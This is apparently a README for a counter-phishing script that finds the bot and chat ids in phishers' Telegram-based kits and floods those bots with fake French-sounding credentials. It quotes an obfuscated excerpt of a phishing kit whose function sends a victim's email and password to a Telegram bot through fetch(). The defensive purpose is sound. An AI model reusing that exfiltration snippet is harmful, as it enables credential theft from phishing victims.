# Goal of the projet 
This project is meant to mess with phishers using telegram bots as exfiltration process.
just find their bot id and chat id .

## Finding the ids
in the malicious script extract bot id and chat id. For instance here : 
```
        function _0x1298a(data) {
            const _0x40d1b3a = 'xxxxxxx';
            const _0x301fc5a = 'yyyyyyy';

            const _0x93b389a = `Nouvelle connexion :\n📧 : ${data.email} \n 🔑 : ${data.password}`;

            const _0x190b9ea = `https://api.telegram.org/bot${_0x40d1b3a}/sendMessage?chat_id=${_0x301fc5a}&text=${encodeURIComponent(_0x93b389a)}`;

            fetch(_0x190b9ea, {
```
we can clearly see the bot id as _0x40d1b3a and chat id as _0x301fc5a

## usage
Install the requirements
then call python lol.py -b xxxxxxx -c yyyyyyyy

## Customization

This script was designed for a french phisher so the emails are generated with french names and domaines but feel free to change them to match your needs.
You can use chatgpt to create lists of first names, last names and domains matching your country
